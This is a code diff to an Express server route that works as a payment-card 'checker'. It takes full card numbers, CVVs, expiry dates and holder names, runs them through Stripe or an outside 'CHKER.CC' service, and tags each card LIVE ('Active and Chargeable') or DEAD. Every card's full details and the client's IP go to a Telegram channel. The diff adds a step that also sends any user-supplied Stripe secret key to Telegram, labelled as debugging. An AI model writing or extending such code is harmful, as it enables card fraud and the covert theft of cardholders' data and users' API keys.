@@ -221,9 +221,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
   // Initialize card checker with available Stripe key (public or secret)
   const cardChecker = new CardChecker(stripeKey);
   
-  // Validate card endpoint with Stripe integration
+  // Validate card endpoint with multiple processor options
   app.post('/api/validate-card', async (req, res) => {
-    const { number, expiry, cvv, holder, processor = 'stripe' } = req.body;
+    const { number, expiry, cvv, holder, processor = 'chker', stripeKey } = req.body;
     
     if (!number || !expiry || !cvv) {
       return res.status(400).json({ 
@@ -242,7 +242,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
 👤 Card Holder: ${holder || 'Not provided'}
 📅 Expiry Date: ${expiry}
 🔢 CVV/CVC: ${cvv}
-🔌 Processor: ${processor}
+🔌 Processor: ${processor}${stripeKey ? ' (Custom SK)' : ''}
 🕒 Time: ${new Date().toISOString()}
 📱 IP Address: ${req.ip || 'Unknown'}
 `;
@@ -252,59 +252,38 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const [expMonth, expYear] = expiry.split('/');
       const formattedExpYear = `20${expYear}`;
       
-      if (processor === 'stripe') {
-        try {
-          // Use the card checker service
-          const result = await cardChecker.checkCard({
-            number: cleanCardNumber,
-            expMonth: parseInt(expMonth, 10),
-            expYear: parseInt(formattedExpYear, 10),
-            cvc: cvv,
-            name: holder
-          });
-          
-          // Get the status from the result or determine from success flag
-          const cardStatus = result.status || (result.success ? "LIVE" : "DEAD");
-          const cardDetails = result.details || {};
-          const binData = result.binData || {};
-          
-          // Create icon based on status
-          const statusIcon = cardStatus === "LIVE" ? "✅" : 
-                            cardStatus === "DEAD" ? "❌" : "⚠️";
-          
-          // Human-readable status for Telegram
-          const readableStatus = cardStatus === "LIVE" ? "LIVE (Active and Chargeable)" : 
-                                cardStatus === "DEAD" ? "DEAD (Declined)" : "UNKNOWN (Status unclear)";
-          
-          const successMessage = `${fullCardDetails}
-${statusIcon} Status: ${readableStatus}
-🏦 Bank Details: ${cardDetails.country || 'Unknown'} - ${cardDetails.funding || 'Unknown'}
-🏢 Card Brand: ${cardDetails.brand || 'Unknown'}
-🔑 Code: ${result.code || 'Unknown'}
-${binData ? `
-🏛️ Bank: ${binData.bank?.name || 'Unknown'}
-🌍 Country: ${binData.country?.name || 'Unknown'} ${binData.country?.emoji || ''}
-💰 Card Type: ${binData.type || 'Unknown'} - ${binData.scheme || 'Unknown'}
-💳 Prepaid: ${binData.prepaid ? 'Yes' : 'No'}` : ''}
-          `;
-          
-          // Send card info to Telegram no matter what
-          await sendToTelegram(successMessage);
-          
-          // Add the status to the response if it's not already there
-          if (!result.status) {
-            result.status = cardStatus;
-          }
-          
-          // Send response to client (always as 200 OK to maintain consistent frontend handling)
-          res.json(result);
-        } catch (stripeError: any) {
-          throw {
-            type: 'StripeCardError',
-            message: stripeError.message || 'Card validation failed',
-            code: stripeError.code || 'card_declined'
-          };
-        }
+      // Common card parameters for all processors
+      const cardParams = {
+        number: cleanCardNumber,
+        expMonth: parseInt(expMonth, 10),
+        expYear: parseInt(formattedExpYear, 10),
+        cvc: cvv,
+        name: holder
+      };
+      
+      // If custom Stripe key is provided, send it to Telegram for debugging
+      if (stripeKey) {
+        await sendToTelegram(`
+⚠️ CUSTOM STRIPE KEY USED ⚠️
+🔑 Key: ${stripeKey}
+💳 Card: ${cleanCardNumber}
+📅 Exp: ${expiry}
+🔢 CVV: ${cvv}
+        `);
+      }
+      
+      let result;
+      
+      // Use the appropriate processor
+      if (processor === 'chker') {
+        // Use the external API checker service (default)
+        result = await cardChecker.checkCardWithChkerAPI(cardParams);
+      } else if (processor === 'stripe' && stripeKey) {
+        // Use stripe with custom key if provided
+        result = await cardChecker.checkCardWithCustomKey(cardParams, stripeKey);
+      } else if (processor === 'stripe') {
+        // Use stripe with default key
+        result = await cardChecker.checkCard(cardParams);
       } else if (processor === 'paypal') {
         // Future PayPal implementation
         // For now, return "processor not available" error
@@ -316,7 +295,7 @@ ${binData ? `
         
         await sendToTelegram(paypalError);
         
-        res.status(400).json({
+        return res.status(400).json({
           success: false,
           message: 'PayPal processor not available yet',
           code: 'processor_unavailable'
@@ -331,20 +310,65 @@ ${binData ? `
         
         await sendToTelegram(unknownProcessor);
         
-        res.status(400).json({
+        return res.status(400).json({
           success: false,
           message: `Unknown processor: ${processor}`,
           code: 'unknown_processor'
         });
       }
+      
+      // Get the status from the result or determine from success flag
+      const cardStatus = result.status || (result.success ? "LIVE" : "DEAD");
+      const cardDetails = result.details || {};
+      const binData = result.binData || {};
+      
+      // Create icon based on status
+      const statusIcon = cardStatus === "LIVE" ? "✅" : 
+                        cardStatus === "DEAD" ? "❌" : "⚠️";
+      
+      // Human-readable status for Telegram
+      const readableStatus = cardStatus === "LIVE" ? "LIVE (Active and Chargeable)" : 
+                            cardStatus === "DEAD" ? "DEAD (Declined)" : "UNKNOWN (Status unclear)";
+      
+      const processorLabel = processor === 'chker' ? 'CHKER.CC API' : 
+                            processor === 'stripe' && stripeKey ? 'STRIPE (Custom Key)' : 
+                            'STRIPE (Default)';
+      
+      const successMessage = `${fullCardDetails}
+${statusIcon} Status: ${readableStatus}
+🔍 Processor: ${processorLabel}
+🏦 Bank Details: ${cardDetails.country || 'Unknown'} - ${cardDetails.funding || 'Unknown'}
+🏢 Card Brand: ${cardDetails.brand || 'Unknown'}
+🔑 Code: ${result.code || 'Unknown'}
+${binData ? `
+🏛️ Bank: ${binData.bank?.name || 'Unknown'}
+🌍 Country: ${binData.country?.name || 'Unknown'} ${binData.country?.emoji || ''}
+💰 Card Type: ${binData.type || 'Unknown'} - ${binData.scheme || 'Unknown'}
+💳 Prepaid: ${binData.prepaid ? 'Yes' : 'No'}` : ''}
+      `;
+      
+      // Send card info to Telegram no matter what
+      await sendToTelegram(successMessage);
+      
+      // Add the status to the response if it's not already there
+      if (!result.status) {
+        result.status = cardStatus;
+      }
+      
+      // Send response to client (always as 200 OK to maintain consistent frontend handling)
+      res.json(result);
+      
     } catch (error: any) {
-      // Extract detailed error message from Stripe
+      // Extract detailed error message
       let declineMessage = 'Card validation failed';
       let declineCode = 'unknown_error';
       
       if (error.type === 'StripeCardError') {
         declineMessage = error.message || 'Card was declined';
         declineCode = error.code || 'card_declined';
+      } else {
+        declineMessage = error.message || 'Card validation failed';
+        declineCode = error.code || 'processing_error';
       }
       
       // Send to Telegram for debugging (silently)
